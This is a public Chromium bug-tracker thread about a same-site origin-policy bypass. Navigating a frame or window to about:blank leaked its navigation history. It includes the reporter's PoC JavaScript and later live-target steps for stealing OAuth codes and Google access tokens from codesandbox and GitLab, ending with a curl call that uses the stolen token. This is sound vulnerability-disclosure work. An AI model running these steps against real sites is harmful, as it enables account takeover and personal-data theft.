# Security: SOP bypass leaks navigation history of iframe from other subdomain if location changed to about:blank

| Field | Value |
|-------|-------|
| **Issue ID** | [40060755](https://issues.chromium.org/issues/40060755) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Internals>Sandbox>SiteIsolation, UI>Browser>Navigation |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | jo...@gmail.com |
| **Assignee** | ja...@chromium.org |
| **Created** | 2022-09-01 |
| **Bounty** | $2,000.00 |

## Description

**VULNERABILITY DETAILS**  

I read Gareth Heyes <https://portswigger.net/research/using-hackability-to-uncover-a-chrome-infoleak> blog about a SOP bypass when navigating an iframe to about:blank. From what I can see his bug is since fixed. But I found another leak that can be achieved in a similar manner.

If a page on a subdomain (or domain) frames another subdomain of the same top domain it will not have access to the iframes location by SOP. But by changing the iframes location to about:blank the iframes window will now be accessible from the top window. And the window.navigation.entities() will still contain all navigation entities from the previously framed subdomain.

Example:  

<https://sub1.example.com> contains

<html>
<head></head>
<body>
<script>
onload = function(){
frames[0].location = 'about:blank';setTimeout(()=>alert(frames[0].navigation.entries()[0].url), 500)
};
</script>
<iframe id="x" src="//sub2.example.com/test.se"></iframe>
</body>
</html>

will show an alert from sub1 containing the url from sub2.

This just proves one url. If the framed subdomain have more entries in the navigation history they are all accessible from the top window at this point.

**VERSION**  

Chrome Version 105.0.5195.52 (Oficial version) (x86\_64)  

Operating System: Mac Os

**REPRODUCTION CASE**  

<https://subdomain1.joaxcar.com/sop.html>

This site contains the HTML from above

## Attachments

- [sop.html](attachments/sop.html) (text/plain, 286 B)
- [1.html](attachments/1.html) (text/plain, 1.3 KB)
- [2.html](attachments/2.html) (text/plain, 320 B)
- [3.html](attachments/3.html) (text/plain, 132 B)
- [4.html](attachments/4.html) (text/plain, 397 B)
- [5.html](attachments/5.html) (text/plain, 544 B)
- [state.html](attachments/state.html) (text/plain, 250 B)
- [links3.html](attachments/links3.html) (text/plain, 212 B)
- [poc.html](attachments/poc.html) (text/plain, 1.4 KB)

## Timeline

### bo...@chromium.org (2022-09-01)

I reproduced the behavior on Windows @ 105/Stable and Linux at 102 (nominally equivalent to Extended). 

Setting severity to High since by my interpretation of our severity guidelines [1] this is an example of reading cross-origin data. However, consider the severity assessment as preliminary until others with more context on SOP bugs get a chance to take a look. 

[1] https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/security/severity-guidelines.md#toc-high-severity

[Monorail components: Internals>Sandbox>SiteIsolation UI>Browser>Navigation]

### jo...@gmail.com (2022-09-02)

Thanks for looking into this. I have made some more tests and a slightly more advanced PoC

From my testing the leak works in these domain scenarios

example.com reading history of subdomain.example.com
subdomain.example.com reading history of example.com
subdomain1.example.com reading history of subdomain2.example.com

I have not gotten it to work cross top domain

Another addition to the impact of the bug is that it also work for windows opened by the main window. For example using window.open(). This allows for an attack to be conducted both on frames and on new windows.

To demonstrate the leak I have set up this site https://sub1.joaxcar.com/1.html that contains a frame of https://blog.joaxcar.com/sop2/2.html . You can navigate around in the frame to create some history and then click the "Leak history" in the man window to extract the history from the frame. I also use history.back() on the frame after the leak to restore the users session. This will make the attack almost invisible to the user of the page who will be able to continue using the frame.

The page also contains a PoC opening a new window by clicking a button. This will open a new window with https://blog.joaxcar.com/sop2/2.html where you can navigate around. Then go back. to the original tab and click "Leak history from window" and you will leak the new tabs history.

I have attached the HTML files used. To test locally just host the files with for example "python3 -m http.server 8000" and edit your /etc/hosts file to add some mock domains. Remember to update the 1.html file to reflect your mock domain and port number to localhost. My hosts file entries

127.0.0.1 sub1.example.com
127.0.0.1 sub2.example.com
127.0.0.1 example.com

start the server and visit http://sub1.example.com:8000/1.html

Hope this helps to evaluate the impact here.

Best regards
Johan


### jo...@gmail.com (2022-09-02)

And as this also work with window objects, there is also an other risk, which is leaking history through the opener. If a link with rel=opener is opened or if window.open() is used without blocking opener the opened window can leak the opening windows history.

Clicking a link like this one (on a page on sub1.example.com)
 <a href="http://sub2.example.com/5.html" rel="opener" target="_blank">

will allow the opened window to leak the navigation history as described above.

I have a working PoC here
https://sub1.joaxcar.com/4.html

Click on some of the navigation and then click "open window", this will open a page on blog.joaxcar.com containing the history from sub1.joaxcar.com

See attached files for local hosting of the same

### cr...@chromium.org (2022-09-02)

japhet@: This looks like a problem with the Navigation API's window.navigation.entries() field, possibly leaving stale information around within the renderer process after a navigation (e.g., to about:blank).  Can you take a look?  And can you note when the Navigation API shipped?  Is M102 the right starting point to use?

For reference, I think the original report's blog post link about inspiration was referring to https://crbug.com/chromium/1336904.  That was classified as low severity, likely because it's an information leak of baseURI, which leaks some bits of history but not significant amounts of cross-origin data.

In this bug, there's also no direct access to the victim origin: mainly a leak of URLs from history (which is more of a privacy leak than security, but admittedly can sometimes contain login tokens, etc).  Another mitigating factor is that it doesn't appear to bypass Site Isolation, and only affects cross-origin, same-site cases that are likely in the same process.  It'll be worth confirming if the process boundary is sufficient, and if origin-level isolation (e.g., using Origin-Agent-Cluster) would have helped, but that's not a mitigating factor on its own (given the low rollout of that so far).

Since this is a limited leak of information (URL history) in limited cases (same-site), I'll drop this to at least medium severity, but we should better compare the full impact of this to the full impact of https://crbug.com/chromium/1336904 to see if they should both be low or both be medium.

bookholt@: Was there a reason for the Needs-Feedback label?  I didn't see a question in https://crbug.com/chromium/1359122#c1, so I'll remove that for now.

### jo...@gmail.com (2022-09-02)

I can try to add some information about impact in regard to the 1336904 bug.

The bug described by Gareth in 1336904 had these preconditions:

An attacker would need to find a frameable page that contained at least one iframe. By framing the page in an attacker controlled page, the attacker could then change the inner iframe to about:blank to extract the current URL from the framed page. This is quite restrictive as a lot of pages containing any data of value in their URL are not frameable. But it seems like the attack would work on any frameable page, no mather domain (I have not confirmed this). The victim do need to interact with the framed page on the attackers domain though.

So to summarize 1336904. An attacker could embed a frameable page containing an inner iframe and then leak the middle frames current URL.



The issue described here have some different conditions (most of them adding to the severity I would argue):
1. An attacker can first of all get a lot more information out of a successful attack (I have had tabs with over hundred entries in the navigation history) so the possibility to leak sensitive data is way higher.
2. There is no need for an iframe in the window one wants to target. If the target is framable it can be used in the same way as in 1336904, but without the restriction of also having an iframe of its own
3. The attack can also be made against window objects, making it possible to target pages that do not allow for cross origin framing. And it also opens up for the attack to be made "from the inside out" by attacking the opener of a window if the attacker controls a rel=opener link in the target page or can inject a link in a window.open action (this is more of an escalation of a regular "tab nabbing" vulnerability). In this case the user will also interact with the victim page on the original domain, unknowingly that another window can read the actions.

What is restricting the attack, as you pointed out, is that it can only be made "same site". This is a big restriction but is highly dangerous on services that allow for users to work under a subdomain. I have verified that the behavior is effective on some large service providers, but restricted on some. I have yet not found what mitigation is restricting access on some domains.

To summarize, I belive that the risk of sensitive information disclosure is higher in this scenario despite the same site restriction. I hope that this helps pin it down somewhat. I will get back if I find out what type of mitigations there are to this issue at present.

Best regards
Johan

### [Deleted User] (2022-09-06)

[Empty comment from Monorail migration]

### [Deleted User] (2022-09-06)

[Empty comment from Monorail migration]

### ja...@chromium.org (2022-09-06)

Good catch!

NavigationApi usuaslly gets entries() from the browser process for a cross-document navigation, but when navigating to about:blank, we copy from the previous NavigationApi object (because the browser process isn't involved in about:blank navigations). I didn't consider the cross-origin -> about:blank case in implementing that copy logic.

As creis@ noted, site isolation defends against the worst variants of this leak (only cross-origin-but-same-site will leak with site isolation enabled; without it, cross-site will leak, too). That's because the cross-site case swaps processes when navigating to about:blank with site isolation enabled, and that allows us to use the correct logic in the browser process.

The fix is striaghtforward and out for review: https://chromium-review.googlesource.com/c/chromium/src/+/3878043

### [Deleted User] (2022-09-07)

Setting milestone and target because of medium severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### gi...@appspot.gserviceaccount.com (2022-09-08)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/35f7edb7dfd3ca5009ce3a0c18e5bf1b4f283c85

commit 35f7edb7dfd3ca5009ce3a0c18e5bf1b4f283c85
Author: Nate Chapin <japhet@chromium.org>
Date: Thu Sep 08 20:03:35 2022

Explicitly guard against cross-origin entry copy in NavigationApi::InitializeForNewWindow

Bug: 1359122
Change-Id: I96f33e8aae6d9c19a29dee870992cf33a8ab12c1
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3878043
Auto-Submit: Nate Chapin <japhet@chromium.org>
Commit-Queue: Nate Chapin <japhet@chromium.org>
Reviewed-by: Domenic Denicola <domenic@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1044728}

[modify] https://crrev.com/35f7edb7dfd3ca5009ce3a0c18e5bf1b4f283c85/third_party/blink/renderer/core/navigation_api/navigation_api.cc
[add] https://crrev.com/35f7edb7dfd3ca5009ce3a0c18e5bf1b4f283c85/third_party/blink/web_tests/external/wpt/navigation-api/navigation-history-entry/entries-after-blank-navigation-from-cross-origin.html


### jo...@gmail.com (2022-09-13)

Hi again, great to see that a fix is on the way!

I just wanted to add some additional impact here as I have been playing around with the navigation API. The API also includes a concept of "state" which gives developers the ability to store any object type state data connected to a specific history entry. I just wanted to point out that these states are also leaked through this attack, in addition to just the URLs.

An, hacky, example can be viewed here: https://joaxcar.com/state.html

I load the page https://sub1.joaxcar.com/links3.html in an iframe, this page just sets a state item to the current navigation entry. The main page then navigates the iframe to about:blank and shows an alert with the leaked state data

The two pages are attached, there is not much new in terms of content in the pages. The important part is that this state data is leaked.

Thanks again for fixing this!

Best regards
Johan 

### [Deleted User] (2022-10-14)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-10-24)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-11-03)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### do...@chromium.org (2022-11-04)

Fixed by https://chromium.googlesource.com/chromium/src/+/35f7edb7dfd3ca5009ce3a0c18e5bf1b4f283c85

### [Deleted User] (2022-11-04)

[Empty comment from Monorail migration]

### [Deleted User] (2022-11-04)

[Empty comment from Monorail migration]

### am...@google.com (2022-11-11)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2022-11-11)

Congratulations, Johan! The VRP Panel has decided to award you $2,000 for this report. A member of our finance team will be in touch with you soon to arrange payment. In the interim, please let us know what name/handle/tag you would like us to use in acknowledging you for this issue. Thank you for your efforts and reporting this issue to us! 

### am...@google.com (2022-11-11)

[Empty comment from Monorail migration]

### jo...@gmail.com (2022-11-16)

Hi amyressler@google.com  (@amyressler) thanks for the reply here and the fix for this issue.

I am very grateful for the bounty, but I feel like I was not able to convey what I think is the true impact here. As this looks like being rewarded in a lower medium. I have created a new PoC on a live target where I can use this bug to leak a Google account token by abusing the Google Oauth flow and then use the bug to leak the token to the attacker.

Would it make a difference if I supplied this PoC even if the reward process have made their statement? I am sorry that I did not do this before, but I thought that the PoC that I provided would suffice for a quality report above base case.

Best regards
Johan

### cr...@chromium.org (2022-11-17)

Interesting, and thanks for following up.  Per https://crbug.com/chromium/1359122#c8, our understanding was that this bug would not allow cross-site cases to work, only cross-origin same-site cases.  Do you have a case where a non-google.com site is able to access history URLs from google.com?  That might prompt us to reconsider the severity (IIUC).

### am...@chromium.org (2022-11-17)

That is correct. 
Johan, if you can provide a poc that demonstrates this where a non-google.com site can access history URLs from google.com we would be interested in that and we would reconsider the severity and happily reassess for a potential change in VRP reward amount. 

### jo...@gmail.com (2022-11-17)

Hi again, and thanks for getting back here!

As you stated, there is no way to use this to access data cross site. What I wanted to point out was the fact that this could have a bigger impact than what I felt my PoC maybe showed. I will give you an example here, and leave it to you to decide if this increases the severity.

So how I would have gone about exploiting this would take advantage of two configurations at a target site. (I draw my inspiration here from Frans Rosen's work on OAuth flows https://labs.detectify.com/2022/07/06/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/). We need a target that allows:

1. A subdomain that can contain attacker supplied JavaScript, this could be by a feature (as I will show) or by a bug (say an XSS or subdomain takeover)
2. OAuth login
3. A way to get an OAuth flow to get into a "failed state" (se the blog post for all the details here)

What part three really above amounts to is to find a site where the site for example only allow the `code` flow, that will return and consume any token as a query parameter. If the attacker instead asks for a `code+id_token` (from Google OAuth) the response will instead contain a code and an id_token in the fragment of the URL. And it will be stuck there as the site does not consume it.

An attacker will now take advantage of the fact that IF the victim is already logged into the service (and the OAuth provider) the OAuth flow will just run through, and the user will land on a page with the unused code and any tokens in the fragment of the URL. The attacker page can now leak these tokens and codes and both steal PII from the Google API, and perform an account takeover on the targeted application.

To summarize. The attacker creates a page on a subdomain sub.example.com when the user click anywhere on the page, the subdomain window will open a new window containing an OAuth flow with the attacker's planted state parameter. The flow will finish and the victim (in the new window) will end up on example.com/auth/callback#code=abc&id_token=abc. The subdomain window will now use the bug from this report to leak the fragment. The attacker now have access to the victim's id_token containing PII and to the code that the attacker can use with his/her own state parameter to finish login as the victim in his/her own browser.

I have a PoC of this working on https://codesandbox.io . This application allows users to host example pages under subdomains like test-site.codesandbox.io AND it allows for Google OAuth to sign in. Moreover, by changing from code flow to any fragment flow, the page will fail to log in. Thus, it checks all the three boxes from above.

To test this:
1. Go to https://codesandbox.io/signin and create an account using Google OAuth (the victim), and log in
2. Open another browser session (the attacker)
3. Again go to https://codesandbox.io/signin and click Google OAuth, but this time only copy the state parameter from the OAuth link. Do not log in.
4. In the victim browser now go to my PoC page on https://joaxcar-poc-3t059v.codesandbox.io/?state=ABC and replace ABC with the state from step 3
5. When the page loads there will be two buttons, one will leak code and id_token, the other will leak Google API access_token (with the scope set by codesandbox)
6. Clicking a button will open a new window, and the attack will take 4 seconds. When it is finished go to the original tab, and you will find the leaked data in an alert box and in the terminal.

The attacker can now use the returned code to finish log in as the victim in the attacker window, if you like. (replace STATE and CODE)

https://codesandbox.io/auth/google/callback?state=STATE&code=CODEw&scope=email+profile+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email+openid&authuser=0&prompt=none

 But I think this proves the point.

 So what I wanted to show here is that this flaw in Google actually put quite a lot of sites in direct danger for account takeover attacks, and to leak (scoped) access tokens to OAuth providers. I have confirmed that similar "failed states" of OAuth is possible in multiple pages (GitLab.com for example) but an attacker would first need to find a subdomain to abuse for the attack. I do still think that this elevates this bug from just "leaking some information", but you will be the judge of that!

 If you need me to get into more details of this type of attack, I can elaborate on any part that is confusing!

 Best regards
 Johan

### jo...@gmail.com (2022-11-17)

A small addition to the example above. First of the PoC above is for a complete account takeover on codesandbox. To only leak a (scoped) access token to Google API, you can just put a random string as the state and click the "use token" button.

 I also wanted to point out that the codesandbox example do not use any other bugs. They use subdomains for user generated content, which is not great, but should be safe in this context. And the OAuth flow "failed states" issue is something that a lot of applications have and is a part of the Google OAuth flow. It should not be considered a bug per se either.

If you want to test a simpler version to prove a point I will also give you this "manual PoC" on GitLab.com. This attack would require the attacker to find an injection in any of gitlab.com's subdomains (there are a lot of them). I will show the simpler impact of only getting a Google API token.

1. Sign up for a gitlab.com account using Google OAuth https://gitlab.com/users/sign_in
2. Make sure you are signed in
3. Go to https://forum.gitlab.com/
4. Open a terminal in dev-tools (this is to simulate an XSS on this subdomain)
5. Run these commands in order
win = open("https://accounts.google.com/o/oauth2/auth?client_id=805818759045-aa9a2emskmnmeii44krng550d2fd44ln.apps.googleusercontent.com&redirect_uri=https%3A%2F%2Fgitlab.com%2Fusers%2Fauth%2Fgoogle_oauth2%2Fcallback&response_type=token&scope=email+profile&state=test")
win.location = "about:blank"
hash = new URL(win.navigation.entries()[0].url).hash
token = new URLSearchParams(hash).get("access_token")
console.log(token)

Then take the printed token and run this in a unix terminal (replace TOKEN)
token="TOKEN"
curl --header "Authorization: Bearer $token" "https://www.googleapis.com/oauth2/v2/userinfo"

This will now return info about the user logged in to GitLab.com

Here I used a random state parameter and the token flow, any XSS on a subdomain to Gitlab.com could have also used the flow from my other PoC to gain account takeover.

This is one of the reasons why I think that this bug was quite impactful. As google OAuth is so pervasive that finding sites where this could have been abused to leak PII through Google API and gaining account takeover would not have been a problem.

### am...@chromium.org (2022-11-21)

Hi Johan, we appreciate the amount of effort you exhibited here to provide a new POC and repro steps. While we appreciate this, even with the information presented, this issue requires significant preconditions to execute and given the pre-requisite to find a victim site that meets all the criteria, this issue seems relegated to a specific set of sites and it is unclear as to how many sites would be impacted by this issue. 
While this is definitely a security issue that should have been and is now fixed, due to this issue being rather significantly mitigated, the VRP Panel feel this reward amount is appropriate for this report for this issue. 

### jo...@gmail.com (2022-11-21)

Thanks for getting back! I fully understand, at least I got the opportunity to fully explain my view and am grateful for that. It was a pleasure reporting and interacting with the team, hopefully this will not be my last report to you here :)

Does this fix count as "been released to all our users" so that I could do a write-up about it publicly?

Best regards
Johan

### am...@chromium.org (2022-11-21)

Of course! If there is a time we don't get back to you about a question -- please always reach out. 
We also hope it's not the last report from you to us in Chrome. 

Our goal is to open security bugs to the public once the bug is fixed and *the fix has been shipped to a majority of users*. However, many vulnerabilities affect products besides Chromium, and we don’t want to put users of those products unnecessarily at risk by opening the bug before fixes for the other affected products have shipped.

Therefore, we make all security bugs public within approximately 14 weeks of the fix landing in the Chromium repository. The bot will automatically remove the Restrict-View label and add the allpublic label at that time and you are then free to publicly discuss this issue. 
This issue considered Fixed on 3 November, so public disclosure date would be on 9 February 2023 if my math is correct. We appreciate you keeping this issue disclosed only to us until that time! 

### do...@chromium.org (2022-11-22)

Just chiming in here as an engineer, and not as a member of the VRP: I think this issue was actually fixed on September 9 (https://crbug.com/chromium/1359122#c10). I just noticed when doing some bug triage that we hadn't closed the issue, so marked it as fixed on November 4 (https://crbug.com/chromium/1359122#c15). Maybe that affects the timeline, or maybe not; amyressler@ is best placed to say authoritatively :)

### am...@chromium.org (2022-11-22)

Thanks domenic@ :) This is less a VRP policy and more a Security policy. Because there may be multiple CLs that result in a given security issue being resolved and the because a fix CL being landed does not initiate the merge process (meaning that the fix isn't yet in the process of getting shipped and helping to close the patch gap), the sheriffbot automation leverages the date when the issue is closed as Fixed (or Verified) to initiate the 14-week countdown process. 
In https://crbug.com/chromium/1359122#c15, the issue is marked as Fixed on 3 November (PST) / 4 November (JST) so the security/sheriffbot automation will update this bug as allpublic 14 weeks from that date. 

Johan -- If there is a deadline that is close to the public disclosure date and you're seeking to write/publicly discuss this issue a bit sooner, do please reach out. We can discuss a slightly earlier disclosure date if there is a need. 

### jo...@gmail.com (2022-11-23)

A final question here amyressler@chromium.org 

i saw in another bug report that the reported issue got a CVE and a mention in a https://chromereleases.googleblog.com/ update post. Is this something one have to request or is it assigned automatically?

Any reference could be done to
Johan Carlsson (@joaxcar)

Thanks again for the fix and working with me on understanding how everything here works!

### ad...@google.com (2022-12-12)

Hi, virtual Amy here. Yes, we will automatically assign a CVE and give you a mention in the release notes when this rolls out to stable. Thanks again for the report.

### [Deleted User] (2023-02-10)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### am...@chromium.org (2023-02-10)

The fix commit did not get picked up by the automation in M107 release. Fix shipped in 107 milestone. 
cc'ing pgrace@ so this can be included in the orphaned CVE process and get a release notes update. TY! :) 

### pg...@google.com (2023-02-10)

[Empty comment from Monorail migration]

### pg...@google.com (2023-02-12)

[Empty comment from Monorail migration]

### pg...@google.com (2023-07-28)

[Empty comment from Monorail migration]

### pg...@google.com (2023-07-28)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1359122?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Internals>Sandbox>SiteIsolation, UI>Browser>Navigation]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40060755)*
